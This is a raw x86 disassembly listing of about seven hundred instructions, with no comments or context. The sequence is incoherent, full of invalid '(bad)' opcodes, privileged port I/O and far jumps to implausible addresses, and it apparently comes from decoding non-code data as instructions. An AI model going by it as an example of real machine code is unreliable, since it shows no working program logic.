  42dd8d:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  42dd8f:	frstor [ebx+0x2]
  42dd92:	xor    cl,BYTE PTR [ecx]
  42dd94:	and    al,0xd2
  42dd96:	(bad)  
  42dd97:	not    DWORD PTR [eax]
  42dd99:	ficom  WORD PTR [ebp-0x2c]
  42dd9c:	mov    ch,0xac
  42dd9e:	sub    BYTE PTR [edi-0x2bfcbeb0],cl
  42dda4:	mov    edx,0x6975f69e
  42dda9:	retf   0xd60f
  42ddac:	mov    BYTE PTR [ebp+0x64],al
  42ddaf:	and    dl,BYTE PTR [eax+0x7ac06ad5]
  42ddb5:	repz and eax,0x4ff09ed7
  42ddbb:	(bad)
  42ddbf:	push   es
  42ddc0:	mov    bh,bh
  42ddc2:	xor    al,0x75
  42ddc4:	out    dx,al
  42ddc5:	mov    cl,0x4d
  42ddc7:	cdq    
  42ddc8:	add    eax,0x113f7c02
  42ddcd:	ins    BYTE PTR es:[edi],dx
  42ddce:	cmp    eax,0x1e4e4c20
  42ddd3:	leave  
  42ddd4:	test   DWORD PTR [esi+0x61],edi
  42ddd7:	jb     0x42ddfe
  42ddd9:	rcl    DWORD PTR [ecx],1
  42dddb:	inc    edx
  42dddc:	xchg   bl,ch
  42ddde:	jge    0x42ddfe
  42dde0:	enter  0xe2f3,0x81
  42dde4:	and    al,0xdc
  42dde6:	ret    
  42dde7:	in     al,0xac
  42dde9:	lahf   
  42ddea:	pusha  
  42ddeb:	xchg   DWORD PTR [ebp+0x5c],edx
  42ddee:	pop    es
  42ddef:	fidivr WORD PTR [esi+eax*2]
  42ddf2:	not    ah
  42ddf4:	jnp    0x42de2d
  42ddf6:	mov    ch,0xe1
  42ddf8:	popf   
  42ddf9:	sub    ax,0x88ec
  42ddfd:	pop    ss
  42ddfe:	dec    eax
  42ddff:	icebp  
  42de00:	adc    DWORD PTR [eax],esi
  42de02:	cld    
  42de03:	lock dec eax
  42de05:	add    esi,edx
  42de07:	lds    ecx,FWORD PTR ds:0x3c84711b
  42de0d:	test   DWORD PTR [edi],eax
  42de0f:	or     BYTE PTR [eax+0x5727184b],0xd9
  42de16:	inc    edi
  42de17:	stc    
  42de18:	jp     0x42de1c
  42de1a:	les    ebx,FWORD PTR [eax]
  42de1c:	push   cs
  42de1d:	or     BYTE PTR [ebp+0x5ab89b78],dl
  42de23:	out    0xff,eax
  42de25:	das    
  42de26:	push   ds
  42de27:	xchg   edi,eax
  42de28:	jge    0x42ddc1
  42de2a:	gs mov eax,0x40b58ecd
  42de30:	mov    eax,esi
  42de32:	scas   al,BYTE PTR es:[edi]
  42de33:	into   
  42de34:	dec    eax
  42de35:	dec    esi
  42de36:	arpl   WORD PTR [edx-0x7],si
  42de39:	aas    
  42de3a:	inc    ecx
  42de3b:	mov    ds:0xd5e7b981,eax
  42de40:	sbb    DWORD PTR [ebp+eiz*8-0x57],0x22
  42de45:	add    al,BYTE PTR [eax+0x80a4129]
  42de4b:	jmp    0x605a8fbe
  42de50:	mov    ch,BYTE PTR [ebp+0x39]
  42de53:	shl    BYTE PTR [ebx+0x50],0x3
  42de57:	mov    eax,ds:0xaa42b778
  42de5c:	pusha  
  42de5d:	or     eax,0x2376a147
  42de62:	out    0xe2,al
  42de64:	jecxz  0x42de4f
  42de66:	pusha  
  42de67:	cmc    
  42de68:	test   BYTE PTR [esi],ch
  42de6a:	mov    bl,0x3f
  42de6c:	sahf   
  42de6d:	adc    eax,0x1e12cdef
  42de72:	pop    eax
  42de73:	imul   ebx,esp,0x38
  42de76:	fwait
  42de77:	jp     0x42dec8
  42de79:	ss (bad) 
  42de7b:	aam    0xd6
  42de7d:	inc    ebp
  42de7e:	pop    es
  42de7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42de80:	jp     0x42deae
  42de82:	push   ds
  42de83:	mov    ch,0xec
  42de85:	int    0xb6
  42de87:	(bad)  
  42de88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42de89:	fmulp  st(3),st
  42de8b:	popf   
  42de8c:	sub    eax,0xb5593aa
  42de91:	pop    ebp
  42de92:	out    0x86,eax
  42de94:	mov    dh,0x54
  42de96:	mov    edx,0x60c52b23
  42de9b:	fld    TBYTE PTR [esi-0xf736a5c]
  42dea1:	add    dl,BYTE PTR [ebx+edi*4-0x60]
  42dea5:	test   al,0x31
  42dea7:	xchg   ecx,eax
  42dea8:	cmp    eax,0xe427618c
  42dead:	jmp    0x64e7:0x1e4756e5
  42deb4:	and    dl,0x28
  42deb7:	mov    bl,0xec
  42deb9:	aad    0x45
  42debb:	aam    0xcd
  42debd:	push   ebp
  42debe:	jne    0x42dee2
  42dec0:	mov    dh,0xc2
  42dec2:	pop    esp
  42dec3:	xor    eax,edi
  42dec5:	xlat   BYTE PTR ds:[ebx]
  42dec6:	pop    ds
  42dec7:	mov    WORD PTR [eax+ebx*4+0x3ae95214],?
  42dece:	inc    esi
  42decf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ded0:	xor    al,0xf4
  42ded2:	jl     0x42df31
  42ded4:	jb     0x42df0b
  42ded6:	pop    esi
  42ded7:	ret    0xe6c
  42deda:	js     0x42df11
  42dedc:	mov    BYTE PTR [ebx+0x31c9da65],al
  42dee2:	mov    BYTE PTR [esi-0x65],bl
  42dee5:	add    eax,0x7205e87c
  42deea:	jle    0x42ded3
  42deec:	rcl    DWORD PTR [esi+0x17],1
  42deef:	fiadd  DWORD PTR [ebx-0x5d754969]
  42def5:	mul    DWORD PTR [eax+0x33]
  42def8:	popf   
  42def9:	inc    ebp
  42defa:	je     0x42df01
  42defc:	adc    al,BYTE PTR [eax]
  42defe:	imul   ecx,DWORD PTR ss:[edx+0x7a],0x9
  42df03:	jecxz  0x42df11
  42df05:	in     eax,dx
  42df06:	push   eax
  42df07:	add    dl,BYTE PTR [edi+ebp*8+0x65]
  42df0b:	lods   eax,DWORD PTR ds:[esi]
  42df0c:	pop    ds
  42df0d:	or     ecx,DWORD PTR [ebx+0x2d759512]
  42df13:	or     BYTE PTR [ebx+0x902f805],bl
  42df19:	xor    dl,BYTE PTR [edx-0x54]
  42df1c:	jns    0x42decb
  42df1e:	push   0x54ee1eb9
  42df23:	pop    ebp
  42df24:	mov    esi,ecx
  42df26:	popf   
  42df27:	popf   
  42df28:	ret    
  42df29:	add    al,ah
  42df2b:	lar    esi,WORD PTR [edx]
  42df2e:	cmp    DWORD PTR [ebp+0x15],0x40
  42df32:	push   ds
  42df33:	in     eax,0x97
  42df35:	push   ss
  42df36:	popa   
  42df37:	jl     0x42df30
  42df39:	mov    edi,ebx
  42df3b:	leave  
  42df3c:	xchg   ch,al
  42df3e:	lods   al,BYTE PTR cs:[esi]
  42df40:	outs   dx,BYTE PTR ds:[esi]
  42df41:	cli    
  42df42:	mov    ds:0xf30216e2,eax
  42df47:	mov    ds:0xe760f61a,eax
  42df4c:	dec    esp
  42df4d:	jmp    0x42df83
  42df4f:	cmc    
  42df50:	pop    ss
  42df51:	inc    ecx
  42df52:	arpl   WORD PTR [edx+0x1e],ax
  42df55:	dec    esi
  42df56:	pop    ds
  42df57:	cmp    BYTE PTR [ebx+0x3a],bl
  42df5a:	lahf   
  42df5b:	(bad)  
  42df5c:	dec    edx
  42df5d:	sbb    al,0x17
  42df5f:	sbb    BYTE PTR [eax-0x4110b72b],cl
  42df65:	push   ebp
  42df66:	adc    cl,BYTE PTR [ecx+0x37]
  42df69:	add    edi,DWORD PTR [edx+esi*4-0x2c]
  42df6d:	pop    edi
  42df6e:	scas   eax,DWORD PTR es:[edi]
  42df6f:	pop    esi
  42df70:	sub    ebx,edi
  42df72:	pusha  
  42df73:	dec    ebp
  42df74:	test   eax,0xfce8144a
  42df79:	mov    ebp,0xa973aa8e
  42df7e:	mov    dl,0xac
  42df80:	lods   al,BYTE PTR ds:[esi]
  42df81:	cld    
  42df82:	xchg   ecx,eax
  42df83:	inc    ecx
  42df84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42df85:	fisttp QWORD PTR [edi+0x1e30d1c9]
  42df8b:	dec    ebp
  42df8c:	xor    eax,0x9058a9c
  42df91:	sti    
  42df92:	add    dh,al
  42df94:	xchg   ebp,eax
  42df95:	retf   
  42df96:	add    BYTE PTR [eax],bh
  42df98:	je     0x42df9d
  42df9a:	and    edi,DWORD PTR [edi]
  42df9c:	xchg   esi,eax
  42df9d:	jl     0x42df47
  42df9f:	aad    0x47
  42dfa1:	into   
  42dfa2:	arpl   WORD PTR [edx],ax
  42dfa4:	or     edx,DWORD PTR ds:0x3884884
  42dfaa:	sbb    BYTE PTR [ebx],ah
  42dfac:	jno    0x42df91
  42dfae:	rcr    DWORD PTR [edx],0x1b
  42dfb1:	add    edi,DWORD PTR [edx]
  42dfb3:	ja     0x42df3a
  42dfb5:	jmp    0x42df5e
  42dfb7:	sti    
  42dfb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dfb9:	fnstsw WORD PTR [ebx+0x1f]
  42dfbc:	add    DWORD PTR [ecx+0x61a3146d],ebx
  42dfc2:	sbb    al,0x3d
  42dfc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dfc5:	jo     0x42df91
  42dfc7:	cli    
  42dfc8:	push   0xb2c38603
  42dfcd:	es icebp 
  42dfcf:	or     al,0x51
  42dfd1:	add    bl,BYTE PTR [edi]
  42dfd3:	or     DWORD PTR [esi-0x2d],0x7ca0d749
  42dfda:	mov    ecx,0x98e9cd4
  42dfdf:	loop   0x42df6f
  42dfe1:	jo     0x42e030
  42dfe3:	dec    esi
  42dfe4:	mov    ebp,esi
  42dfe6:	lock imul eax,DWORD PTR [esi+0x42904ca],0x342b7203
  42dff1:	test   eax,0xa070a2b8
  42dff6:	jle    0x42dfd1
  42dff8:	pop    ds
  42dff9:	cmp    esp,esp
  42dffb:	rol    DWORD PTR [eax],cl
  42dffd:	stos   DWORD PTR es:[edi],eax
  42dffe:	dec    edx
  42dfff:	add    eax,0xf7351c30
  42e004:	jae    0x42e008
  42e006:	inc    eax
  42e007:	sbb    eax,esi
  42e009:	inc    ecx
  42e00a:	sbb    esi,edx
  42e00c:	xchg   ebx,eax
  42e00d:	outs   dx,BYTE PTR ds:[esi]
  42e00e:	fs aas 
  42e010:	and    BYTE PTR [edx-0xf],dl
  42e013:	cli    
  42e014:	addr16 mov ds:0x5064,eax
  42e018:	cmp    DWORD PTR [edx-0x6a740a51],edx
  42e01e:	dec    esi
  42e01f:	and    cl,BYTE PTR [edi]
  42e021:	retf   
  42e022:	fdivp  st(1),st
  42e024:	mov    esi,esi
  42e026:	jecxz  0x42e09c
  42e028:	jb     0x42e02d
  42e02a:	lods   al,BYTE PTR ds:[esi]
  42e02b:	jge    0x42e098
  42e02d:	or     ebx,DWORD PTR [eax+0x21]
  42e030:	adc    DWORD PTR [esi+0x76935d60],ebp
  42e036:	(bad)  
  42e037:	int    0xa6
  42e039:	icebp  
  42e03a:	out    0xd4,al
  42e03c:	cmp    DWORD PTR ds:0xd8e9b30a,esp
  42e042:	jbe    0x42e0bf
  42e044:	mov    edi,edi
  42e046:	add    DWORD PTR [edx-0xd],0x699f5b76
  42e04d:	add    bl,BYTE PTR [edx-0x30]
  42e050:	les    ebx,FWORD PTR [esp+ebp*4-0x6a]
  42e054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e055:	mov    ebx,0x1a794560
  42e05a:	mov    ebp,0x960a16e2
  42e05f:	aam    0x6a
  42e061:	ret    
  42e062:	add    eax,0xcd9fef39
  42e067:	cld    
  42e068:	mov    BYTE PTR [ecx-0x7d],dh
  42e06b:	and    eax,0xaaec01dc
  42e070:	xor    al,BYTE PTR [ebx]
  42e072:	int3   
  42e073:	mov    eax,ds:0xfb9c28c2
  42e078:	and    bh,BYTE PTR [edx-0xdb3248]
  42e07e:	pop    esp
  42e07f:	daa    
  42e080:	mov    BYTE PTR [eax-0x25a43519],al
  42e086:	dec    ebp
  42e087:	pop    edi
  42e088:	aad    0x84
  42e08a:	bound  edx,QWORD PTR [ecx]
  42e08c:	adc    eax,0xa5d2f7d8
  42e091:	in     eax,0x18
  42e093:	jl     0x42e01d
  42e095:	mov    bl,0x95
  42e097:	cs dec esp
  42e099:	addr16 cmp bh,ch
  42e09c:	ins    BYTE PTR es:[edi],dx
  42e09d:	add    ah,BYTE PTR [edx-0x7f65c2ae]
  42e0a3:	test   eax,0x871f6335
  42e0a8:	lahf   
  42e0a9:	mov    ah,BYTE PTR [esi+0x7153b110]
  42e0af:	pop    ebp
  42e0b0:	mov    WORD PTR [ebx],ds
  42e0b2:	push   ds
  42e0b3:	rcr    DWORD PTR [eax-0x3fca6f1c],0x35
  42e0ba:	push   ds
  42e0bb:	sbb    esi,DWORD PTR [ebp-0x4514082a]
  42e0c1:	neg    eax
  42e0c3:	stos   BYTE PTR es:[edi],al
  42e0c4:	dec    ebp
  42e0c5:	sub    al,0x53
  42e0c7:	ret    
  42e0c8:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e0ca:	sbb    al,0xac
  42e0cc:	mov    dh,0x5d
  42e0ce:	gs in  eax,0x8b
  42e0d1:	ds mov ?,edi
  42e0d4:	sub    dl,BYTE PTR [ebx+0x2f]
  42e0d7:	pop    edx
  42e0d8:	fadd   DWORD PTR ds:0x37facdb4
  42e0de:	inc    ecx
  42e0df:	mov    edx,0xa3165e2b
  42e0e4:	mov    BYTE PTR [edi+0x50],al
  42e0e7:	mov    dh,0x3f
  42e0e9:	(bad)  
  42e0ea:	cmc    
  42e0eb:	leave  
  42e0ec:	add    edx,DWORD PTR ds:0xccb01f7a
  42e0f2:	mov    dh,0xb4
  42e0f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e0f5:	mov    al,0x11
  42e0f7:	cmp    BYTE PTR [ecx-0x1a],ch
  42e0fa:	pop    ds
  42e0fb:	xchg   ecx,eax
  42e0fc:	pop    ecx
  42e0fd:	xchg   ebp,eax
  42e0fe:	and    dh,BYTE PTR ds:0x6c038411
  42e104:	pop    eax
  42e105:	outs   dx,BYTE PTR ds:[esi]
  42e106:	sub    edx,esp
  42e108:	or     al,0x2b
  42e10a:	adc    edi,DWORD PTR [esi]
  42e10c:	rcr    DWORD PTR [ecx+0x1f],0xe7
  42e110:	push   esi
  42e111:	in     al,dx
  42e112:	inc    eax
  42e113:	rcl    DWORD PTR [ecx],1
  42e115:	pop    esi
  42e116:	push   esp
  42e117:	fsubr  DWORD PTR [ebx]
  42e119:	add    ah,al
  42e11b:	hlt    
  42e11c:	fld    TBYTE PTR [esi+0x4045f168]
  42e122:	add    al,0x54
  42e124:	cmp    al,0xb1
  42e126:	jbe    0x42e174
  42e128:	mov    BYTE PTR [ebp+0x47],cl
  42e12b:	jg     0x42e0de
  42e12d:	dec    ebx
  42e12e:	xchg   ebp,eax
  42e12f:	pop    edi
  42e130:	xchg   edx,eax
  42e131:	add    ah,BYTE PTR [esi+edx*8-0x4d]
  42e135:	sbb    DWORD PTR [ecx+0x1f188949],edx
  42e13b:	jnp    0x42e137
  42e13d:	cli    
  42e13e:	fwait
  42e13f:	dec    edi
  42e140:	out    0x5d,eax
  42e142:	repz inc edx
  42e144:	inc    edx
  42e145:	push   es
  42e146:	aas    
  42e147:	xlat   BYTE PTR ds:[ebx]
  42e148:	cmp    eax,0x3819d096
  42e14d:	inc    ebp
  42e14e:	dec    ebp
  42e14f:	fldcw  WORD PTR [edi-0x68]
  42e152:	pop    ds
  42e153:	xchg   ebx,eax
  42e154:	jmp    0x8afe996c
  42e159:	jge    0x42e12c
  42e15b:	aam    0x3b
  42e15d:	shr    BYTE PTR [esp+edx*4-0x56fb0e49],1
  42e164:	mov    eax,0xbc03a643
  42e169:	punpckldq mm2,mm5
  42e16c:	add    eax,0xa50f90fa
  42e171:	fabs   
  42e173:	sub    al,0x89
  42e175:	scas   eax,DWORD PTR es:[edi]
  42e176:	ss scas al,BYTE PTR es:[edi]
  42e178:	cdq    
  42e179:	out    dx,al
  42e17a:	xchg   edi,eax
  42e17b:	mov    di,0x2405
  42e17f:	xlat   BYTE PTR ds:[ebx]
  42e180:	cmp    eax,0xf5f002d0
  42e185:	call   0xdcb95a6
  42e18a:	xchg   esi,eax
  42e18b:	cmp    ebx,ebx
  42e18d:	repnz push ds
  42e18f:	je     0x42e17e
  42e191:	add    eax,0xc7a80e24
  42e196:	pop    ebx
  42e197:	sub    edi,DWORD PTR [edx+0x59776e89]
  42e19d:	jmp    0x68ab2711
  42e1a2:	push   cs
  42e1a3:	pushf  
  42e1a4:	inc    ebx
  42e1a5:	adc    eax,0xa5775758
  42e1aa:	scas   al,BYTE PTR es:[edi]
  42e1ab:	aam    0xcb
  42e1ad:	adc    ebx,esp
  42e1af:	mov    DWORD PTR ds:[edi],ebx
  42e1b2:	mov    DWORD PTR [edx],ebp
  42e1b4:	add    ebp,DWORD PTR [ebx]
  42e1b6:	xchg   esi,eax
  42e1b7:	repz (bad) 
  42e1b9:	jecxz  0x42e1ac
  42e1bb:	cdq    
  42e1bc:	adc    DWORD PTR [esi-0x67],ebp
  42e1bf:	shr    dh,cl
  42e1c1:	es jnp 0x42e1e7
  42e1c4:	sub    DWORD PTR [ebx],ebx
  42e1c6:	dec    ecx
  42e1c7:	out    dx,eax
  42e1c8:	mov    WORD PTR [ebp-0x4e8ea9c6],ss
  42e1ce:	int    0x55
  42e1d0:	rol    bl,cl
  42e1d2:	xchg   ebp,eax
  42e1d3:	aad    0xb4
  42e1d5:	or     eax,0x19131055
  42e1da:	cmp    DWORD PTR [eax+0x605da389],0x42
  42e1e1:	inc    edi
  42e1e2:	repz leave 
  42e1e4:	inc    esp
  42e1e5:	add    cl,BYTE PTR [eax]
  42e1e7:	mov    eax,ds:0x2332ed0e
  42e1ec:	nop
  42e1ed:	add    DWORD PTR [ecx-0x7b],ebx
  42e1f0:	inc    ecx
  42e1f1:	inc    esp
  42e1f2:	bound  ebx,QWORD PTR [ebx-0x2a136405]
  42e1f8:	test   BYTE PTR [esi],bh
  42e1fa:	addr16 cmp eax,0xd456155d
  42e200:	cmp    edx,DWORD PTR [edi+0x3]
  42e203:	mov    ch,0xc9
  42e205:	inc    ebx
  42e206:	mov    ebp,0x1d52267d
  42e20b:	loop   0x42e195
  42e20d:	retf   
  42e20e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e20f:	mov    ecx,0xf93d2515
  42e214:	std    
  42e215:	add    eax,0x3e20e306
  42e21a:	outs   dx,BYTE PTR ds:[esi]
  42e21b:	jl     0x42e1d3
  42e21d:	cwde   
  42e21e:	pusha  
  42e21f:	add    DWORD PTR [edi],eax
  42e221:	std    
  42e222:	xchg   ecx,eax
  42e223:	adc    dh,BYTE PTR ss:[ebx+0x3d0bd48f]
  42e22a:	mov    ah,0x70
  42e22c:	pushf  
  42e22d:	push   ecx
  42e22e:	or     DWORD PTR [esi-0x77],ecx
  42e231:	loope  0x42e1f6
  42e233:	sar    ebx,0xf1
  42e236:	jp     0x42e1d4
  42e238:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e239:	xchg   ch,bl
  42e23b:	outs   dx,BYTE PTR ds:[esi]
  42e23c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e23d:	ins    DWORD PTR es:[edi],dx
  42e23e:	pop    edi
  42e23f:	(bad)  
  42e240:	das    
  42e241:	or     eax,0xeb87dfcc
  42e246:	jp     0x42e25d
  42e248:	int3   
  42e249:	ins    BYTE PTR es:[edi],dx
  42e24a:	push   ds
  42e24b:	arpl   dx,cx
  42e24d:	es out 0x91,eax
  42e250:	sahf   
  42e251:	pop    ss
  42e252:	xor    ebp,esi
  42e254:	arpl   bp,dx
  42e256:	pop    ds
  42e257:	lods   al,BYTE PTR ds:[esi]
  42e258:	popf   
  42e259:	(bad)  
  42e25b:	jb     0x42e25f
  42e25d:	cld    
  42e25e:	pop    ds
  42e25f:	jne    0x42e2b2
  42e261:	ror    DWORD PTR [ebx+0x4a],1
  42e264:	into   
  42e265:	mov    bl,al
  42e267:	call   0xf37f:0x250d8e26
  42e26e:	jmp    0xa0535d8a
  42e273:	cmc    
  42e274:	outs   dx,BYTE PTR ds:[esi]
  42e275:	test   eax,0x85c0231f
  42e27a:	int    0xe3
  42e27c:	xor    DWORD PTR [edx+0x232c474],edx
  42e282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e283:	lock test dl,0x7d
  42e287:	scas   eax,DWORD PTR es:[edi]
  42e288:	addr16 adc dh,bh
  42e28b:	pand   mm2,QWORD PTR [esi+0x2c]
  42e28f:	ins    DWORD PTR es:[edi],dx
  42e290:	mov    DWORD PTR [ecx+0x63d48b1b],edx
  42e296:	arpl   sp,dx
  42e298:	fisub  DWORD PTR [ebx]
  42e29a:	out    dx,al
  42e29b:	mov    ecx,0x35463216
  42e2a0:	(bad)  
  42e2a1:	gs push ds
  42e2a3:	mov    edx,0x1f950df4
  42e2a8:	or     ch,bl
  42e2aa:	xchg   ebx,eax
  42e2ab:	bound  esp,QWORD PTR [esp+eax*4]
  42e2ae:	pop    ecx
  42e2af:	cmp    dl,bh
  42e2b1:	out    dx,eax
  42e2b2:	pop    DWORD PTR [eax+0x1a266c97]
  42e2b8:	leave  
  42e2b9:	add    esi,DWORD PTR [edi+0x73]
  42e2bc:	sbb    bl,0x61
  42e2bf:	arpl   WORD PTR [ecx],bp
  42e2c1:	pop    esp
  42e2c2:	stos   BYTE PTR es:[edi],al
  42e2c3:	mov    WORD PTR [edx+edx*1+0x48f763bf],?
  42e2ca:	mov    ?,WORD PTR ds:0xf3960296
  42e2d0:	sbb    DWORD PTR [esi+esi*1+0x5cbf897e],esi
  42e2d7:	or     ch,bl
  42e2d9:	jae    0x42e34c
  42e2db:	cld    
  42e2dc:	lods   al,BYTE PTR ds:[esi]
  42e2dd:	add    eax,0x111409aa
  42e2e2:	xchg   esp,eax
  42e2e3:	out    0xcf,eax
  42e2e5:	inc    edx
  42e2e6:	adc    edi,DWORD PTR [edx]
  42e2e8:	mov    al,0x65
  42e2ea:	sub    ah,ah
  42e2ec:	or     al,BYTE PTR ds:0xaacd05ed
  42e2f2:	das    
  42e2f3:	jge    0x42e2e3
  42e2f5:	add    eax,0xaf8ed9b8
  42e2fa:	(bad)  
  42e2fb:	repz xor al,0x18
  42e2fe:	push   ds
  42e2ff:	popf   
  42e300:	clc    
  42e301:	clc    
  42e302:	rcl    DWORD PTR ds:0xd4cd5180,0x98
  42e309:	hlt    
  42e30a:	sbb    al,0x13
  42e30c:	(bad)  
  42e30d:	outs   dx,DWORD PTR ds:[esi]
  42e30e:	cmc    
  42e30f:	ins    DWORD PTR es:[edi],dx
  42e310:	inc    eax
  42e311:	and    eax,0xc988313a
  42e316:	xor    DWORD PTR [edi-0x6a],esi
  42e319:	es sahf 
  42e31b:	in     eax,dx
  42e31c:	jb     0x42e320
  42e31e:	sbb    dl,0xf3
  42e321:	in     al,0x2b
  42e323:	push   cs
  42e324:	mov    WORD PTR [edi+0x65],?
  42e327:	sti    
  42e328:	xor    DWORD PTR [edx+edi*1],ebx
  42e32b:	mov    eax,0x12b685b0
  42e330:	ror    BYTE PTR [ebp+0x64],cl
  42e333:	mov    esi,0x8d80a99e
  42e338:	dec    ecx
  42e339:	out    0xa8,eax
  42e33b:	jecxz  0x42e2f5
  42e33d:	mov    edx,0x8f88ca1a
  42e342:	in     eax,0xb9
  42e344:	(bad)  
  42e345:	call   0xf9e7d8be
  42e34a:	xchg   esp,eax
  42e34b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e34c:	mov    al,0x6c
  42e34e:	lods   eax,DWORD PTR ds:[esi]
  42e34f:	adc    BYTE PTR [eax-0x6aaa4c39],al
  42e355:	idiv   DWORD PTR [ecx+0x7e]
  42e358:	std    
  42e359:	aas    
  42e35a:	sub    al,0xa5
  42e35c:	adc    eax,0xe9236dc9
  42e361:	pop    ebx
  42e362:	out    dx,eax
  42e363:	dec    ebp
  42e364:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e365:	mov    dl,0x17
  42e367:	stc    
  42e368:	rcl    BYTE PTR [ecx-0x691929c1],0x91
  42e36f:	test   edx,ebx
  42e371:	xlat   BYTE PTR ds:[ebx]
  42e372:	add    BYTE PTR [ecx-0x5a82b067],ch
  42e378:	sar    BYTE PTR [edi+ebx*4],cl
  42e37b:	push   ebp
  42e37c:	ret    
  42e37d:	mov    ah,0x8e
  42e37f:	sub    ebp,DWORD PTR [esi]
  42e381:	sbb    al,0x1c
  42e383:	pop    edi
  42e384:	fs mov edx,0x3d8836e9
  42e38a:	cwde   
  42e38b:	mov    dl,0xe8
  42e38d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e38e:	jo     0x42e314
  42e390:	pop    ebp
  42e391:	inc    esp
  42e392:	lock mov ds:0x880a059d,eax
  42e398:	shl    cl,cl
  42e39a:	sbb    BYTE PTR [esi-0x2bd8e1d0],bh
  42e3a0:	outs   dx,BYTE PTR ds:[esi]
  42e3a1:	cmp    cl,BYTE PTR [esi]
  42e3a3:	lock clc 
  42e3a5:	push   eax
  42e3a6:	jmp    0xe133:0xc20360e5
  42e3ad:	lods   eax,DWORD PTR ds:[esi]
  42e3ae:	retf   
  42e3af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e3b0:	out    0x54,al
  42e3b2:	pop    ds
  42e3b3:	and    esp,0xffffffd7
  42e3b6:	jl     0x42e35b
  42e3b8:	test   ch,ah
  42e3ba:	mov    ds:0xe384cdab,al
  42e3bf:	jne    0x42e359
  42e3c1:	sar    BYTE PTR [ecx+0x5c],0xe6
  42e3c5:	lds    ebp,FWORD PTR [edi+0x70]
  42e3c8:	mov    BYTE PTR [ecx-0x15],dl
  42e3cb:	jg     0x42e421
  42e3cd:	pushf  
  42e3ce:	ja     0x42e39c
  42e3d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e3d1:	add    eax,0x44a9c05e
  42e3d6:	sub    edx,ebp
  42e3d8:	mov    esi,0xb4476c01
  42e3dd:	(bad)
  42e3e1:	and    al,0xdd
  42e3e3:	jae    0x42e3ad
  42e3e5:	add    eax,0xa6519064
  42e3ea:	jge    0x42e3ef
  42e3ec:	outs   dx,DWORD PTR ds:[esi]
  42e3ed:	in     al,dx
  42e3ee:	popa   
  42e3ef:	pop    ebp
  42e3f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e3f1:	out    0x8d,eax
  42e3f3:	mov    al,0x93
  42e3f5:	mov    edi,0x39c0128
  42e3fa:	xor    BYTE PTR [edx-0x63d6dc5c],ah
  42e400:	ins    DWORD PTR es:[edi],dx
  42e401:	ret    0xb9dd
  42e404:	call   0xbd34965e
  42e409:	and    al,0xa1
  42e40b:	aam    0x93
  42e40d:	out    0xd9,al
  42e40f:	idiv   DWORD PTR [esi-0x7472371a]
  42e415:	xor    edx,DWORD PTR [ebp+0x67]
  42e418:	outs   dx,DWORD PTR ds:[esi]
  42e419:	add    ch,BYTE PTR [ecx]
  42e41b:	mov    eax,ds:0xdcec9d20
  42e420:	jne    0x42e46c
  42e422:	push   0x3a031035
  42e427:	xchg   edi,eax
  42e428:	sbb    al,BYTE PTR [ebx-0x5f]
  42e42b:	sbb    eax,0x8caba188
  42e430:	push   ss
  42e431:	xlat   BYTE PTR ds:[ebx]
  42e432:	inc    ebp
  42e433:	mov    ch,dh
  42e435:	add    eax,0x1270274e
  42e43a:	pop    edx
  42e43b:	into   
  42e43c:	push   esp
  42e43d:	push   esp
  42e43e:	add    esi,ebp
  42e440:	mov    BYTE PTR ds:0x86be1b5,dh
  42e446:	mov    al,ds:0xe002a2e6
  42e44b:	xor    BYTE PTR [edx],bh
  42e44d:	std    
  42e44e:	add    al,0xf8
  42e450:	push   ebp
  42e451:	mov    al,0x1f
  42e453:	jg     0x42e455
  42e455:	jmp    0xe02fc50a
  42e45a:	adc    al,0xd7
  42e45c:	and    eax,DWORD PTR [edx-0x64]
  42e45f:	xchg   edi,eax
  42e460:	fs loopne 0x42e3fc
  42e463:	mov    ds:0xac37a1e8,al
  42e468:	aam    0x3b
  42e46a:	cmp    dl,bh
  42e46c:	test   eax,0x3cab780e
  42e471:	cmp    eax,0x35895d37
  42e476:	xchg   edi,eax
  42e477:	bnd js 0x42e4e7
  42e47a:	sbb    ch,bl
  42e47c:	loop   0x42e4e0
  42e47e:	fst    st(6)
  42e480:	int    0x51
  42e482:	loope  0x42e449
  42e484:	test   BYTE PTR [edi+0x1e],ah
  42e487:	xchg   esp,eax
  42e488:	mov    esp,0xff281989
  42e48d:	(bad)  
  42e48e:	data16 mov BYTE PTR [ebx+0x42671f6a],dl
  42e495:	add    DWORD PTR [ecx],0x846d6ae
  42e49b:	mov    ds:0xc7fa02d5,al
  42e4a0:	dec    esp
  42e4a1:	push   es
  42e4a2:	and    BYTE PTR [eax-0x77],al
  42e4a5:	dec    ecx
  42e4a6:	pop    ss
  42e4a7:	mov    ecx,0x232ddd6a
  42e4ac:	cwde   
  42e4ad:	adc    al,0xd8
  42e4af:	sub    ah,BYTE PTR [esi-0x35]
  42e4b2:	push   ebp
  42e4b3:	jne    0x42e487
  42e4b5:	into   
  42e4b6:	add    esp,eax
  42e4b8:	mov    bh,0x59
  42e4ba:	and    dh,0x88
  42e4bd:	cdq    
  42e4be:	scas   al,BYTE PTR es:[edi]
  42e4bf:	lods   al,BYTE PTR ds:[esi]
  42e4c0:	add    eax,0x6e856e1e
  42e4c5:	adc    al,0x26
  42e4c7:	fs push ecx
  42e4c9:	test   cl,ah
  42e4cb:	push   ebp
